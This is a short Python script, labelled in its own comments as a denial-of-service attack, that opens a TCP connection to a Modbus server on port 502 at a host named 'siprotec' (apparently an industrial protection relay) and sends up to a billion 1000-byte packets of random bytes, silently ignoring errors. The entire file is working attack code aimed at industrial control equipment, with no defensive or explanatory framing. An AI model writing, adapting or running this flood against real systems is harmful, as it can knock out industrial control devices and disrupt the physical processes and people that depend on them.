# dos attack with completely garbage packets
# packet size and amount can be customized

import socket
import random

# Replace with the actual IP address and port of your Modbus server
server_ip = "siprotec"
server_port = 502

# dos vars
packet_size = 1000
num_packets = 1000000000

# Create a socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Modbus server
sock.connect((server_ip, server_port))

# Generate a malformed Modbus-like packet with random bytes
malformed_packet = bytes([random.randint(0, 255) for _ in range(packet_size)])

# DOS
for i in range(num_packets):
    try:
        sock.send(malformed_packet)
    # ignore errors
    except Exception as e:
        pass

